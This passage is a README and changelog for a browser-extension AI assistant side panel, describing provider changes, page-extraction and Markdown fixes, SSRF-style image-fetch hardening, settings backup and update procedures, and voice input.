- **SVG removed** from the worker's accepted types (an SVG inside `<img>` cannot run script or resolve external entities, but the side panel's sanitizer already refused SVG data images, so this makes the policy consistent).
- **Coarse errors:** failures return only `unavailable` - no status codes, timings or messages to probe with.
- The side panel now tells the worker which page the user is on (`pageUrl`) so the same-host exception can work.

**Known limits:** a *public* hostname that resolves to a private address (DNS rebinding) cannot be detected from an extension (no DNS API). A redirect from a public URL to an internal one is discarded, but the browser has already sent that one GET; its response is never returned. The side panel's own `<img>` tags for model-emitted Markdown images are still fetched directly by the browser (outside this worker).

# Page-extraction fix: no more DOM insertion into the host page (v1.10.62)

**Fixed:** `content.js` used to clone `document.body` (or the winning article container) and temporarily attach the clone to the live page, off-screen, just to read layout-aware `innerText`. In reader mode, on Amazon pages and in the generic fallback this fired the page's `MutationObserver`s (which can upset SPA frameworks and anti-tamper/anti-bot scripts), briefly duplicated every `id` on the page, could re-trigger media/resource loading, and forced a full-page reflow on large documents.

Extraction now only **reads** the live DOM:
- `readVisibleText()` walks the live tree and reproduces what `innerText` gave for these pages: `display:none` / `[hidden]` / `visibility:hidden` content is left out, block elements and `<p>` break lines, `<br>` is a newline, table cells are tab-separated, `<pre>` whitespace is preserved, the body of a closed `<details>` is omitted, and the same noise elements are skipped as before.
- The reader-mode scoring (`readerModeMeasure`) and the Amazon section text no longer clone anything either.

**Verified** in Chromium against the previous build on article, nested, no-container, link-heavy, image-only and Amazon-style pages, a 36,000-element page and a 3,000-deep DOM: extracted text is byte-for-byte identical, the host page sees 0 DOM mutations during extraction (it saw 2 before), and a very large page extracts about 3x faster. The only clone left is the small, never-attached copy of a reply panel in the Synology Community extractor.

# Review and bug-fix pass (v1.10.61)

**Fixed:**
- Markdown: text on the line(s) directly under a list item (indented or "lazy" continuation) was rendered *above* the whole list; it now stays inside its item.
- Voice input: switching the voice language while listening left the old recognizer running, so two recognizers wrote into the question box (duplicated text, wrong language). Results/errors/end events from a replaced recognizer are now ignored.
- Attaching an image while a text-only model (GPT-OSS) is selected failed with a provider HTTP 400; the panel now explains it up front and keeps the draft and attachments.
- History could silently stop saving: attachment text (up to 180,000 characters per message) was stored in full for up to 100 conversations and exceeded the 10 MB `chrome.storage.local` quota. Stored copies of attachment blocks are now condensed to the same preview size the background worker already sends for history turns, and a quota error drops the oldest conversations and retries instead of losing the save.
- ZIP attachments: decompression is capped, so a small crafted archive can no longer expand to gigabytes in memory.
- Provider HTTP errors showed the entire response body (often a full HTML error page); they are now cut to a short excerpt.
- History backup ZIPs were written with an invalid DOS date (0), which some tools flag; they now use 1980-01-01.
- Conversation titles for Chinese/Japanese messages (no spaces) were the whole message; titles are now capped at 80 characters.
- The question box regains focus after an answer finishes.
- Manifest: added `minimum_chrome_version` 116 (the side-panel `open()` API used by the context menu needs it).

**Not changed, worth knowing:** the quick *Translate* button always asks for Chinese (the "Preferred Translation Language" setting only affects the right-click menu); `buildMessages()` sends two `system` messages after the conversation history, which strict chat templates (some Qwen builds) can reject.

# Provider cleanup and bug-fix pass (2026-10-16)

**Removed:** the Z.AI, Claude (Anthropic) and OpenAI streaming code, their message builders, and every remaining reference in the UI strings and privacy policy. The supported providers are DeepSeek, Groq and OpenRouter (Gemini had already been removed earlier). The model catalog itself (`models.js`) was not changed apart from marking the two text-only GPT-OSS models with `vision: false`. The provider-specific entries further down this file are kept only as history.

**Fixed:**
- Inline code containing `$&`, `$$` etc. was corrupted when rendered; headings ending in `#` (e.g. `C#`) lost the character; `2 * 3 * 4` was rendered as italics.
- The display language was backed up under the wrong key (`language` instead of `languagePreference`) and so was never restored. Old backups are migrated.
- Importing a settings backup left the Tavily field stale and could blank other fields, so a later Save overwrote the imported keys.
- Cancelling a request (Clear / New Topic) while the page was being captured still sent the request and could throw; the composer is now locked immediately and a storage error no longer leaves it stuck.
- A reply that was empty is now reported as an error instead of being saved as an empty assistant turn (providers reject those, which broke the rest of the conversation). Errors reported mid-stream and a final unterminated SSE line are now handled.
- An unknown model ID is now rejected instead of silently being sent to DeepSeek; restoring a conversation uses its saved model/label.
- Automatic web research: attachment text and the page-visuals note are no longer treated as part of the question; Chinese/Japanese questions are matched correctly; ordinary question words no longer count as "not covered by the page"; "explain the current page" no longer counts as a request for fresh information. Without a Tavily key, automatic research is skipped instead of failing the request (explicit requests and Explain still report the missing key).
- Fact Check now splits and keeps Chinese/Japanese sentences.
- Page extraction: the MailPlus recipient fallback and the Reddit ad filter no longer match unrelated elements; the content script always replies.

# AI model connection update (2026-10-07, v1.10.54) — superseded: Gemini, Claude, OpenAI and Z.AI entries below no longer apply

- DeepSeek: `deepseek-flash` remains the API ID for DeepSeek V4.1 Flash; reasoning effort is pinned to high.
- Gemini: confirmed on `gemini-3.8-flash` using Google's Interactions API.
- Gemini transient HTTP 408/429/5xx failures are retried with exponential backoff, jitter, and `Retry-After` support; `Gemini 3.7 Flash` is also available as a manual fallback.
- Claude: updated to Fable 5.1, Opus 5.5, Sonnet 5.5, and Haiku 4.5; the Messages API output budget is increased so modern adaptive/extended thinking has room to complete an answer.
- OpenAI: replaced the stale GPT-5.6 entries with GPT-6 Astra, GPT-6.1 Sol, and GPT-6 Luna on the Responses API, with medium reasoning effort.
- Z.AI: added `glm-5.3-flash` through the documented OpenAI-compatible PaaS Chat Completions endpoint. A dedicated Z.AI API-key field is included in Settings and Settings Backup.
- Model selections saved by older builds are migrated through explicit legacy-ID/label aliases instead of silently falling back to the first model.
- Background requests now resolve provider/model configuration only from the canonical model catalog; UI-supplied provider/API-model overrides are ignored.

# Language output fix (2026-09-22)

- The language selected in **Settings > Language** is now enforced as the authoritative response language for every AI request.
- The extension sends a final language guard immediately before the current user message, so the model is less likely to follow the language of the user's typed question, webpage, conversation history, or custom prompt.
- Explicit translation requests still use the requested target language for the translated text; surrounding assistant prose remains in the selected Settings language.

<!-- README.md -->
# Structure
AI-Assistant/
├── manifest.json
├── models.js
├── background.js
├── content.js
├── storage-keys.js
├── settings-storage.js
├── url-safety.js
├── sensitive-sites.js
├── i18n.js
├── privacy-policy.md
├── icons/
│   └── icon16.png / icon48.png / icon128.png (declared in manifest.json's "icons" and "action.default_icon" fields)
├── options/
│   ├── options.html
│   ├── options.css
│   └── options.js
└── sidepanel/
    ├── sidepanel.html
    ├── sidepanel.css
    ├── sidepanel.js
    ├── mic-permission.html  ← opened as its own tab for the mic permission grant, see "Voice input" below
    ├── mic-permission.css
    └── mic-permission.js

# Deployment
1. brave://extensions → Developer mode → Load unpacked → select the AI-Assistant-main folder
2. For updates, do NOT click "Remove" first — removing an extension permanently deletes all of its stored data (see "Updating to a newer version" below)
3. Click the toolbar icon to open the side panel; click "Settings" to paste and save an API key
4. After changing code: reload the extension card; reopen the side panel; refresh existing web pages

## Fixed: Gemini/Claude/ChatGPT could still answer in English despite a different Settings > Language (v1.10.51)

`buildMessages()` (DeepSeek/OpenRouter) already inserted the language guard twice - once at the top of the request and again as a system message immediately before the current user turn - but Gemini, Claude, and ChatGPT go through `buildSystemInstruction()` instead, whose output only ever appeared once, in the single top-level `system_instruction`/`system`/`instructions` field. In longer conversations, that one mention could lose out to several turns of history plus an English-language current question, and those three providers intermittently reverted to English regardless of the selected display language. `buildGeminiInteractionInput()`, `buildClaudeMessages()`, and `buildOpenAIInput()` now each append the same `outputLanguageInstruction(lang)` text as a trailing block on the current user turn, matching the reinforcement DeepSeek/OpenRouter already had.

## Added: automatic web research for unanswered page questions (v1.10.41)

The extension now checks whether the current page covers a question's important terms and requested years before calling the selected AI model. When it does not, it sends the user's question to Tavily Search and supplies the returned web evidence to the model. This is topic-independent: no product, make, model, or website is hard-coded. A configured Tavily Search API key remains required. The response language continues to follow the extension's display-language setting.

## Fixed: complete Amazon product context (v1.10.40)

The old 20,000-character page-context cap could discard product details located later in a long Amazon page. Page capture, side-panel forwarding, and the final provider prompt now consistently allow up to 120,000 characters.

Amazon product pages additionally collect the title, feature bullets, product description, A+ content, overview, detail bullets, and product-detail tables before appending cleaned full-page text. This gives product information priority without excluding questions about other readable page content. Collapsed Amazon product modules are included deliberately, so their text is available without requiring the user to expand every panel.

## Updating to a newer version without losing settings (v1.10.26+)

All user data (API keys, theme, language, custom prompt, saved model choice, conversation history) lives in `chrome.storage.local`, which Chrome persists per **extension ID**. Before v1.10.26, `manifest.json` had no `"key"` field, so for a "Load unpacked" install Chrome derived the extension ID from a hash of the **absolute folder path**. Loading each updated download from a new folder (e.g. `AI-Assistant-main`, then `AI-Assistant-main (2)`, ...) produced a *different* ID, so Chrome treated the update as a brand-new extension with empty storage — which is why every update appeared to reset all settings.

Fix: `manifest.json` now includes a `"key"` field (a base64-encoded RSA public key). With a `key` present, Chrome derives the ID from that key instead of the folder path, so the ID is stable — `jhnjhgicilnghoellcbkiokhlhkpbmjh` — no matter where the folder lives, and loading a new version is a true update: same ID, same storage, settings kept.

**Important: never click "Remove" between versions.** Removing an extension deletes its entire `chrome.storage.local` by design — that is Chrome's behavior for every extension, and no manifest field can change it. Removing and then reinstalling always starts from empty settings, even with the pinned ID. The pinned key only preserves data when the old install is updated *in place*.

Recommended update procedure:
1. Extract the new version's zip somewhere temporary.
2. Copy its contents over your permanent extension folder (the one originally chosen via "Load unpacked"), overwriting the old files.
3. In brave://extensions, click the ⟳ reload icon on the AI Assistant card, then reopen the side panel.

That's it — no removal, no "Load unpacked" again, settings intact. (If you instead extract each version to a new folder and pick it with "Load unpacked", Chrome may refuse with "already loaded", because the pinned key makes every folder produce the same ID — that refusal is protecting your installed copy's data. Update in place as above rather than removing.)

**Settings Backup (v1.10.27):** Settings now also has an "Export settings" button that writes every settings key — API keys, custom prompt, theme, languages, selected model — to a single JSON file, and an "Import settings" button that restores them in one click. Use this as the recovery path for anything a remove/reinstall, a profile reset, or a move to another machine: export first, remove/reinstall, import after. The file contains your API keys in readable plain text, so store it like a password.

**Key management:** the matching RSA private key must never be committed to or shipped inside the extension folder. It is kept outside the project as `ai-assistant-private-key.pem`; it is required to build signed CRX updates or to preserve this same ID when publishing to the Chrome Web Store, so keep a backup of it. If it is ever lost, a new key can be pinned the same way — but that changes the ID and resets storage again.

# Validation checklist (file names must match exactly, UTF-8, no .txt suffix)
Every file below is imported or loaded at runtime and must be present in any package and tracked by git:

- Root: `manifest.json`, `background.js`, `content.js`, `models.js`, `storage-keys.js`, `i18n.js`, `settings-storage.js`, `settings-crypto.js`, `pii-filter.js`, `translate-lines.js`, `url-safety.js`, `sensitive-sites.js` (imported by the side panel)
- `options/`: `options.html`, `options.js`, `options.css`
- `sidepanel/`: `sidepanel.html`, `sidepanel.css`, `sidepanel.js`, `mic-permission.html`, `mic-permission.css`, `mic-permission.js`
- `icons/`: `icon16.png`, `icon48.png`, `icon128.png`

**Run before every build or commit:** `node scripts/check-package.mjs`. It follows every static `import` from the manifest entry points, fails if a required file is missing, and (in a git checkout) fails if one is untracked or git-ignored. `background.js` imports `pii-filter.js`, `settings-crypto.js` (via settings-storage), `translate-lines.js` and `url-safety.js`; a package built from git without them makes the service worker fail to load. `.gitignore` keeps build artifacts (`*.zip`, `*.crx`, `*.pem`, `dist/`) out of version control.

## File Uploads (v1.0.6)

The side panel now has an Upload button below the question box. It accepts images, common text/code files, HTML, and ZIP/WinZip archives. Text and HTML files are read locally and included in the DeepSeek chat request. ZIP files are parsed locally and supported text/HTML entries are extracted and included.

Image attachments are encoded locally as data URLs and sent with the current request. DeepSeek image requests are handled natively by `deepseek-flash`; Groq and OpenRouter receive multimodal image content when the selected model supports vision. The two GPT-OSS models on Groq are text-only, so automatic page screenshots/images are not attached for them.


Version 1.0.9 adds a Settings > Backup History button that exports all locally saved conversations as a standard ZIP file. API keys and custom prompts are not included.

## Voice input (v1.5.0)

A microphone button sits between Upload and the history dropdown. Click it to start dictating into the question box; click it again to stop. It listens continuously (through normal pauses) until you click it off. A small language badge on the button (EN / 中) sets which language it expects — English or Mandarin — since the browser's speech engine needs to be told the language rather than detecting it automatically; it remembers your last choice. Recognized text is appended after anything already typed.

This uses the browser's built-in Web Speech API, so it needs an internet connection and, the first time, a microphone permission grant (a small tab opens for that grant — Chromium side panels have a known bug where the in-panel permission prompt can fail to appear, so a normal tab is used instead and closes itself once you allow access).

**Known Brave limitation:** Brave's speech-recognition backend is unreliable — the classic cloud engine returns a "network" error because Brave doesn't have access to Google's private recognition service, and Brave's newer on-device engine has an open bug where the required language model never finishes installing. Voice input reliably works in Chrome; in Brave it depends on your version, and the extension shows an on-screen error rather than failing silently if it's blocked. If Brave fixes this, no code changes should be needed.

## Historical: DeepSeek models consolidated to deepseek-flash

DeepSeek's current API model is `deepseek-flash` (DeepSeek-V4.1-Flash). The legacy `deepseek-chat` / `deepseek-reasoner` names stopped working on 2026-07-24, and `deepseek-v4-pro` is being retired (requests route to V4.1 Flash after 2026-09-14 Beijing time). This version replaces the three previous DeepSeek options — DeepSeek Chat, DeepSeek Reasoner, and DeepSeek V4 Pro — with a single "DeepSeek V4.1 Flash" entry whose `apiModel` is `deepseek-flash`.

Unlike the earlier V4 line, `deepseek-flash` handles image/vision input natively, so the separate vision-exp endpoint is gone — image requests are sent to the same `deepseek-flash` model. Thinking mode is enabled by default on V4.1 Flash, and `models.js` sends `thinking: {type: "enabled"}` explicitly to pin that behavior (set it to "disabled" to reproduce the old non-thinking Chat behavior). See DeepSeek's [Thinking Mode guide](https://api-docs.deepseek.com/guides/thinking_mode) for the underlying parameters.


## Historical: Gemini support alongside DeepSeek (v1.7.0)

The model dropdown now lists Google Gemini models next to the DeepSeek ones, and Settings has a second, independent "Gemini API Key" field below the DeepSeek one. Either key can be left blank, but Save now requires at least one of the two to be filled in (previously the DeepSeek key alone was required). Picking a Gemini entry from the dropdown and asking a question sends the request to Gemini using the Gemini key; picking a DeepSeek entry still uses the DeepSeek key exactly as before.

Model list as of this version (`models.js`):
- DeepSeek Chat, DeepSeek Reasoner, DeepSeek V4 Pro — unchanged.
- Gemini 3.7 Flash — latest stable Flash model, general-purpose default.
- Gemini 2.5 Pro — Google's most capable stable (non-preview) model, for harder reasoning tasks.

**v1.10.46:** Gemini 3.1 Pro was removed from the available model list. Existing conversations that reference its former model ID retain their saved messages but cannot select that model for new requests.

Implementation notes:
- `background.js` branches on a `provider` field in each `models.js` entry ("deepseek" or "gemini") and calls the provider-specific streaming function. DeepSeek's request/response shape (OpenAI-style `messages`/`choices[0].delta`) is unchanged. Gemini uses the current `interactions?alt=sse` endpoint with `input` content blocks and `step.delta` text events, authenticated via an `x-goog-api-key` header rather than a bearer token. Gemini requests set `store: false`, so conversation state remains in the extension's local history.
- The internal message-passing port between the side panel and the background script was renamed from `"deepseek-chat"` to `"ai-chat"`, since it now carries requests for either provider. This is an internal channel name only and has no effect on stored data or on either provider's API.
- The Gemini API key field's placeholder intentionally does not show a fixed prefix like "AIza...": Google has been transitioning newly issued Google AI Studio keys to a different "AQ." prefix since mid-2026 alongside the older "AIza" format, and both are accepted as-is by the raw `generativelanguage.googleapis.com` endpoint used here.
- Gemini's "thinking" (extended reasoning before answering) is left at each model's own default, and thought summaries are not requested, so only the final answer streams into the chat — no chain-of-thought text should appear.
- Image attachments are sent as image content with the current request using the selected provider's multimodal request format.

## Historical: Claude support added (v1.8.0)

The model dropdown now also lists Anthropic Claude models, and Settings has a third, independent "Claude API Key" field below the Gemini one. Any of the three keys can be left blank, but Save now requires at least one of the three to be filled in. Picking a Claude entry from the dropdown and asking a question sends the request to Anthropic's Messages API using the Claude key; picking a DeepSeek or Gemini entry still behaves exactly as before.

Model list as of this version (`models.js`):
- DeepSeek Chat, DeepSeek Reasoner, DeepSeek V4 Pro — unchanged.
- Gemini 3.7 Flash — unchanged.
- Claude Fable 5 — Anthropic's most capable widely released model, for the hardest tasks.
- Claude Opus 5 — the current Opus-line flagship (supersedes Opus 4.8), for complex agentic/enterprise work.
- Claude Sonnet 5 — Anthropic's recommended default: the best balance of speed and intelligence.
- Claude Haiku 4.5 — the fastest Claude model, for quick/cheap answers.

Claude Mythos 5 was deliberately left out: it's invitation-only under Anthropic's Project Glasswing program and isn't reachable with a normal self-serve API key, so it wouldn't work for extension users even if listed.

Implementation notes:
- `background.js` gained a third branch, `streamClaude`, alongside `streamDeepSeek`/`streamGemini`, feeding the same shared SSE-line reader. Claude's endpoint is Anthropic's native Messages API (`https://api.anthropic.com/v1/messages`), authenticated with an `x-api-key` header plus a required `anthropic-version: 2023-06-01` header — different from both DeepSeek's bearer token and Gemini's `x-goog-api-key`.
- Calling the Claude API directly from the extension's background service worker (rather than through a server-side proxy) requires an extra `anthropic-dangerous-direct-browser-access: true` request header; without it, Anthropic's CORS policy blocks the request outright. This is Anthropic-documented behavior, not a workaround.
- Like Gemini's `system_instruction`, Claude takes the system prompt as a single top-level field (`system`) instead of a `role: "system"` message — Claude actually rejects a `"system"` role inside its `messages` array. `background.js` reuses the same `buildSystemInstruction` helper Gemini already used, and adds a new `buildClaudeMessages` helper (parallel to `buildGeminiContents`) for the user/assistant turns.
- Unlike DeepSeek and Gemini, Anthropic's Messages API requires `max_tokens` on every request; it's set to `4096` here.
- Claude's SSE stream uses named events (`message_start`, `content_block_start`, `content_block_delta`, `content_block_stop`, `message_delta`, `message_stop`, plus periodic pings) rather than DeepSeek/Gemini's unnamed `alt=sse` chunks. The shared reader in `background.js` only ever inspects lines starting with `"data:"` and ignores the preceding `"event:"` line, so no changes to the reader itself were needed — `streamClaude` just extracts text from `content_block_delta` events whose `delta.type` is `"text_delta"` and ignores everything else (tool-use deltas, thinking deltas, pings, etc. don't apply here since this extension doesn't request tools or thinking).
- As with Gemini, no `thinking` field is sent for Claude models. Fable 5/Opus 5/Sonnet 5 use Anthropic's "adaptive thinking," which isn't a simple request-time on/off flag the way DeepSeek's `thinking` field is, so each model's own default is used and only the final answer text streams into the chat.
- Image attachments are sent as image content with the current request when the selected provider/model supports vision.

## Conversation history now restores the model used (v1.8.0)

Previously, reopening a saved conversation from the history dropdown (or reopening the side panel to the last-active conversation) left whatever model happened to already be selected — it did not switch back to whichever model actually answered that conversation. The model dropdown now follows the conversation: selecting an older conversation, or reopening the panel, re-selects the model that produced its most recent reply.

How it works: each assistant reply already tagged its message with a display `modelLabel`; it's now also tagged with the model's internal `id` (`modelId`). Loading a conversation scans its messages from most recent to oldest, looking for the last assistant turn's `modelId`, and applies it to the dropdown (and to the remembered "last used model" in storage) if that id still exists in `models.js`. This means a conversation where the model was switched mid-way (the app has always allowed changing the dropdown between messages) restores whichever model answered last, not the first one used. Conversations saved before this version only have the older `modelLabel` string, so those fall back to matching that label against the current model list; if nothing matches (for example the model was since removed from `models.js`), the currently-selected model is simply left alone rather than being reset. This restore logic is provider-agnostic — it applies equally to DeepSeek, Gemini, and Claude conversations, not just the new Claude ones. `options.js`'s history restore/backup path was updated to carry `modelId` through as well, so a Backup → Restore round trip doesn't silently drop it.

## Fixed: switching models mid-conversation could revert the dropdown (v1.8.1)

Reported behavior: after switching the model dropdown to a different model inside an existing conversation and sending a new message, the dropdown appeared to jump back to the previous model right after Send was clicked.

Root cause: `chrome.storage.onChanged` fires for every write to `conversationHistory`, including this panel's own writes to itself — not just Settings > Restore History, which is the only case it was originally written to handle. `handleSubmit()` saves the conversation (with the user's new question appended) *before* the reply comes back, which triggers this listener. The v1.8.0 fix in `loadConversations()` (see the entry below) then re-derived "the model used by this conversation" from the saved messages, found the conversation's most recent *assistant* turn (which still reflects whichever model was used before the user's latest switch, since the new reply isn't appended until the response finishes), and reset the dropdown to it — even though the request already in flight was correctly using the newly selected model.

Confirmed with an executable test (jsdom-driven, loading the real `sidepanel.html`/`sidepanel.js`/`models.js`, mocked `chrome.*` APIs) that reproduced the dropdown reverting immediately after submit, while also confirming the actual `ASK` message sent to `background.js` already carried the correct, newly selected model the entire time — `selectedModel` is captured once into a local variable at the top of `handleSubmit()`, before this reactive listener has a chance to run, and that captured value (not a fresh read of the dropdown) is what's sent, so **no request was ever actually routed to the wrong provider/model**; this was a misleading-UI bug, not a wrong-backend-call bug.

Fix: `loadConversations()` now takes an optional `{ syncModel }` option (default `true`, unchanged for the initial restore in `init()` and for `selectConversation()`'s later call path). The reactive `chrome.storage.onChanged` listener now (1) skips entirely while `isStreaming` is true — a request from this panel is what triggered the write, so reloading `history`/re-rendering the chat log here would also risk fighting the live streaming bubble, which only exists in memory until the reply is saved — and (2) always calls `loadConversations({ syncModel: false })` otherwise, so this reactive path never touches the model dropdown; only explicit navigation (picking a conversation from history, or the initial panel-open restore) does.

## Fixed: reopening the side panel resumed the last conversation instead of starting fresh (v1.8.2)

Reported behavior: closing the side panel (or restarting the browser) and reopening it continued the previous conversation instead of starting a new one.

Cause: `init()` unconditionally called `loadConversations()`, which reads the persisted `currentConversationId` from `chrome.storage.local` and, if it points at a conversation with messages, loads and displays it. That pointer is written every time a conversation is created or selected and is never cleared except by explicitly starting a new topic, so it survives closing the panel and restarting the browser — meaning nearly any fresh open silently resumed whatever was last active, rather than defaulting to a blank state.

Fix: `loadConversations()` gained an `activate` option (default `true`, unchanged for `selectConversation()` and the reactive `chrome.storage.onChanged` listener). `init()` now calls it with `activate: false` — which loads the saved conversation list (so the history dropdown is populated) without displaying any of them — and then explicitly calls the existing `startNewTopic()` (the same function the "Clear"/"New Topic" button already used), which resets the chat log, model-independent UI state, and clears the persisted `currentConversationId`. Every past conversation remains one click away in the history dropdown; only the *default* view on a fresh open changed. Verified with an executable test (jsdom-driven, real `sidepanel.html`/`sidepanel.js`) that seeded a "last active" conversation, confirmed a fresh init no longer displays it while it still appears in the history dropdown, and confirmed sending a message right after a fresh open creates a new conversation entry rather than appending to the old one.

## Moved the page-context bar below the conversation (v1.8.3)

The "📄 [current page title/URL]" bar (shown when "Read current page" is on and a page is being included as context) previously sat between the header and the chat log, i.e. above the conversation. It's now placed between the chat log and the composer, i.e. below the conversation and directly above the message input box. Only `sidepanel.html` (element order) and `sidepanel.css` (flipped the bar's separator from `border-bottom` to `border-top`, since it now sits against the composer below it instead of the header above it) changed; `sidepanel.js` doesn't reference this element's position, only its ID, so no JS changes were needed. Verified with a DOM-order check against the real `sidepanel.html` (chat log → context bar → composer) and by re-running the existing model-sync/new-conversation tests to confirm the reorder didn't affect any other behavior.

## Fixed: numbered lists in replies didn't count up, and were sometimes just bullets (v1.8.4)

Reported behavior: list responses should show a bullet in front of each item, or if numbered, the number should increase for each item — this wasn't happening reliably.

Cause: the hand-written Markdown renderer in `sidepanel.js` (`markdownToHtml`) unconditionally ended the current list whenever it hit a blank line. Real model output very often writes "loose" lists — a blank line between each item, especially once an item is a full sentence or two — which is valid Markdown and should still be one list. Ending the list on every blank line instead split it into several separate one-item `<ol>`/`<ul>` elements. Numbered lists were hit hardest: each single-item `<ol>` restarts its own count, so every item rendered as "1." instead of counting up. Bulleted lists have the same underlying split, just harder to notice, since every `<li>` still gets a bullet regardless of which `<ul>` it ends up in — but the list loses its single-block grouping and gets extra spacing between what should be one continuous list.

Fix: on a blank line, the parser now looks ahead past any run of blank lines to the next non-blank line. If that line is another item of the *same* list type (ordered stays ordered, bulleted stays bulleted), the list continues instead of being flushed; the list still correctly ends on a blank line followed by anything else (a paragraph, a different list type, a heading, etc.). Numbering itself was never hand-rolled — items render as plain `<li>` inside a real `<ol>`, so the browser numbers them automatically; the fix is entirely about keeping loose-list items grouped into one `<ol>`/`<ul>` so that numbering applies across all of them instead of restarting per item.

Verified by extracting the real `markdownToHtml` function and feeding it tight and loose ordered/unordered lists directly (loose lists now produce one `<ol>`/`<ul>` instead of several), a set of regression cases (list-into-paragraph, list-type switch across a blank line, multiple consecutive blank lines, list-into-heading, and a list at the very end of a message all still behave correctly), and one full end-to-end run (jsdom, real `sidepanel.html`/`sidepanel.js`, a simulated reply with a loose numbered list streamed through the same START/CHUNK/DONE port messages `background.js` sends) confirming the rendered chat bubble contains a single `<ol>` with all list items as siblings.

## Reopening after close still resumed the last conversation for some users - added a second, independent fix (v1.8.5)

This is the same issue v1.8.2 addressed ("closing the panel and reopening it should start a New Topic, not resume the last conversation"), reported again as still happening. v1.8.2's fix lives entirely in `sidepanel.js`'s `init()`, which only runs when the side panel's page is actually reloaded. Research into Chrome's side panel lifecycle confirms closing the panel is expected to tear down its page (this is exactly why the community works around Chrome's lack of a native "panel closed" event by watching for a long-lived port to disconnect - see https://github.com/GoogleChrome/chrome-extensions-samples/issues/998 and the pattern at https://dev.to/latz/chrome-side-panel-simulate-close-event-354h), so `init()` re-running on reopen should be the normal case - but this can't be fully verified without a live browser, and a still-recurring report is real evidence something in that path isn't taking effect for this user.

Added a second, independent layer that doesn't depend on `sidepanel.js`'s own reload path at all: `sidepanel.js` keeps one long-lived port open to `background.js` for the whole time the panel is open (already existed, used for streaming replies). `background.js` now also listens for that port's `onDisconnect` - Chrome's documented signal that the port's other end went away, which happens both when the panel is actually closed and when the service worker itself restarts (normal MV3 behavior after ~30s idle) - and clears the persisted "current conversation" pointer at that point, independently of whatever the side panel's own document does. If the panel is still genuinely open when this fires (a service-worker restart, not a real close), this is harmless: `sidepanel.js` rewrites the same key on its next save regardless, so nothing is lost. `HISTORY_STORAGE_KEY`/`CURRENT_CONVERSATION_KEY` were also pulled out of `sidepanel.js` into a new shared `storage-keys.js` module that both files now import, so the two can't drift onto different literal strings.

Verified with a background.js-only test (no DOM needed): connecting a port and disconnecting it clears the pointer; a differently-named port's disconnect does not; a normal ASK message still routes through to the provider call correctly after the edit (ruling out a regression from inserting the new listener). Re-ran all prior sidepanel.js tests to confirm pulling the two constants into the shared module didn't break anything.

If this still doesn't resolve it, that would point at the side panel's document genuinely persisting (not reloading) across whatever specific action is being used to "close" it, which needs to be pinned down before a further fix (e.g., the exact click target/menu used to close it) - happy to dig further with that detail.

## Historical: ChatGPT/OpenAI support added (v1.9.0) — superseded by v1.10.54

The model dropdown now also lists OpenAI models, and Settings has an independent "OpenAI API Key" field. Save still only requires at least one of the supported provider keys to be filled in.

Model list added (`models.js`), current as of 2026-08-24 per https://developers.openai.com/api/docs/models and https://developers.openai.com/api/docs/guides/latest-model:
- GPT-5.6 Sol — the current OpenAI flagship, for complex reasoning and coding.
- GPT-5.6 Terra — balances intelligence and cost.
- GPT-5.6 Luna — cost-sensitive, high-volume workloads.

GPT-5.6 introduced this explicit three-tier naming scheme, superseding the GPT-5.2/5.3/5.4/5.5 line the same way Claude Opus 5 superseded Opus 4.8. A bare `gpt-5.6` alias also exists (currently resolving to Sol) but isn't used as `apiModel`, for the same reason Claude Haiku 4.5 uses its dated snapshot instead of its alias: an alias can be silently repointed later.

Implementation notes:
- `background.js` gained a fourth branch, `streamOpenAI`. OpenAI's current recommended endpoint is the **Responses API** (`https://api.openai.com/v1/responses`), not the older `/v1/chat/completions` - this is a real API surface change from what a lot of existing OpenAI integration code still targets, confirmed against OpenAI's own migration guide. Authentication is a standard `Authorization: Bearer <key>` header, no extra header needed.
- Like Claude/Gemini, the system prompt is a single top-level field (`instructions`, reusing the same `buildSystemInstruction` helper) rather than a message with a system role, even though OpenAI's `input` array would technically also accept a `system`/`developer` role turn - kept consistent with how the other three providers are wired. A new `buildOpenAIInput` mirrors `buildClaudeMessages`.
- `store: false` is set on every request: this extension is stateless per request (it resends the full history itself, like the other three providers) and never uses OpenAI's `previous_response_id` continuation feature, so there's no reason to let OpenAI retain the response server-side by default.
- Streaming uses OpenAI's typed SSE events (`response.created`, `response.output_text.delta`, `response.completed`, etc.) rather than DeepSeek/Gemini's unnamed `alt=sse` chunks or Claude's `content_block_delta` shape; only `response.output_text.delta` events carry answer text (`delta` is a plain string here, unlike Claude's nested `delta.text`), and the shared `readSse` reader needed no changes.
- **CORS could not be fully verified.** Multiple OpenAI community threads confirm `api.openai.com` doesn't return CORS-permissive headers for a plain webpage origin, and OpenAI's guidance is to proxy through a backend rather than call the API directly from client-side code. That guidance is written for ordinary web pages; this extension's background service worker (with `host_permissions: ["<all_urls>"]`) is a more privileged `fetch()` context that isn't normally subject to the same CORS enforcement - which is exactly what already lets this same file call `api.deepseek.com`, `generativelanguage.googleapis.com`, and `api.anthropic.com` directly. This reasoning could not be confirmed against a live `api.openai.com` request from the sandbox this was built in (its network access is allow-listed to a small set of domains that doesn't include OpenAI's API), so **this needs a real test with a live ChatGPT API key**. Unlike Claude, OpenAI does not document an equivalent explicit browser-access opt-in header to add if a direct request turns out to be blocked - if it is, the fix would most likely require routing these requests through a small backend proxy instead, which would be a larger change.

Verified with a background.js-only test that mocks `fetch()`: confirms the exact request URL/headers/body shape (`model`, `instructions`, `input` array built from history + the new question, `store: false`, `stream: true`), feeds back a realistic multi-chunk Responses-API SSE stream and confirms only the text deltas are extracted and assembled correctly, and confirms a missing key produces the right error without attempting a network call. Also verified end-to-end in the side panel UI (real `sidepanel.html`/`sidepanel.js`) that all three GPT-5.6 tiers render in the dropdown and that selecting one produces an `ASK` payload correctly identifying it. Re-ran every prior test to confirm no regressions.

## OpenRouter support: Free Model (Auto) (v1.10.7)

The model dropdown now includes "OpenRouter: Free Model (Auto)". The previous Ox Alpha, GLM-5.3 Flash, and GLM-5.2 (free) entries have been removed. The extension sends OpenRouter requests to `openrouter/free`, OpenRouter's Free Models Router, which automatically selects an available free model.

OpenRouter documents `openrouter/free` as a zero-price router that selects from currently available free models and filters candidates for request compatibility. The extension still requires an OpenRouter API key in Settings.

The OpenRouter request uses the OpenAI Chat Completions-compatible `{messages, stream}` format and reads streamed text from `choices[0].delta.content`, matching the existing OpenRouter implementation.

## Added: Markdown image rendering (v1.10.2)

Assistant Markdown image syntax such as `![diagram](https://example.com/diagram.png)` is rendered as a sanitized `<img>` element. HTTP(S) images and safe raster `data:image/*` URLs are supported. Images are constrained to the conversation width and lazy-loaded.

## Fixed: a hung request left no way out - "Clear" and the history dropdown now actually stop it (v1.10.1)

